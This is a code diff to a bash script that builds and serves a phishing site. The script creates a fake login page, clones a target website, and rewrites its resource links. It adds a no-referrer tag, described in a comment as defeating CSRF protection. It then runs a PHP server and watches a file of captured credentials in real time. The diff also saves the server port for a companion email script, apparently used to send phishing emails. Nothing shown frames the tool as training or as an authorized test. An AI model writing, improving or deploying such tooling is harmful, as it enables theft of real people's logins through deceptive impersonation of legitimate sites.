@@ -60,6 +60,20 @@ fi
 mkdir -p phishing_site
 cd phishing_site
 
+# Store the server port in a file (will be used by the email script)
+SERVER_PORT=80
+if [ "$EUID" -ne 0 ]; then
+    # Not running as root, use fallback port
+    SERVER_PORT=8080
+    echo -e "${YELLOW}[WARNING]${NC} Not running as root. For port 80, run with: sudo $0"
+    echo -e "${YELLOW}[INFO]${NC} Using fallback port ${SERVER_PORT}..."
+else
+    echo -e "${YELLOW}[INFO]${NC} Running as root, using port ${SERVER_PORT}..."
+fi
+
+# Save port information to a file that can be read by the email script
+echo $SERVER_PORT > ../server_port.txt
+
 # Function to create default phishing login page
 create_default_page() {
     echo -e "${YELLOW}[INFO]${NC} Creating default phishing login page..."
@@ -808,9 +822,17 @@ clone_website() {
         # Add meta tag to prevent CSRF protection by disabling referrer
         sed -i 's/<head>/<head>\n<meta name="referrer" content="no-referrer">/g' "$html_file"
         
-        # Fix paths for resources
-        sed -i "s#href=\"/#href=\"http://$domain/#g" "$html_file"
-        sed -i "s#src=\"/#src=\"http://$domain/#g" "$html_file"
+        # Use base URL with port info for resources if we're not using port 80
+        if [ "$SERVER_PORT" != "80" ]; then
+            local base_url="http://$domain:$SERVER_PORT"
+            # Fix paths for resources with port
+            sed -i "s#href=\"/#href=\"$base_url/#g" "$html_file"
+            sed -i "s#src=\"/#src=\"$base_url/#g" "$html_file"
+        else
+            # Fix paths for resources - standard port 80
+            sed -i "s#href=\"/#href=\"http://$domain/#g" "$html_file"
+            sed -i "s#src=\"/#src=\"http://$domain/#g" "$html_file"
+        fi
     done
     
     # Find the main HTML file (usually index.html)
@@ -1083,7 +1105,7 @@ fi
 
 # Start PHP server and monitor for credentials in one step
 echo -e "${GREEN}[STATUS]${NC} Starting the phishing web server with real-time credential capture..."
-echo -e "${YELLOW}[INFO]${NC} Attempting to start on port 80..."
+echo -e "${YELLOW}[INFO]${NC} Attempting to start on port ${SERVER_PORT}..."
 
 # Use a signal trap to clean up child processes when the script is terminated
 trap 'kill $(jobs -p) 2>/dev/null' EXIT
@@ -1097,12 +1119,4 @@ touch captured_credentials.txt
 tail -f captured_credentials.txt 2>/dev/null &
 
 # Start PHP server (will run until Ctrl-C)
-if [ "$EUID" -eq 0 ]; then
-    # Running as root, try port 80
-    php -S 0.0.0.0:80
-else
-    # Not running as root, suggest sudo
-    echo -e "${YELLOW}[WARNING]${NC} Not running as root. For port 80, run with: sudo $0"
-    echo -e "${YELLOW}[INFO]${NC} Using fallback port 8080..."
-    php -S 0.0.0.0:8080
-fi 
+php -S 0.0.0.0:${SERVER_PORT} 
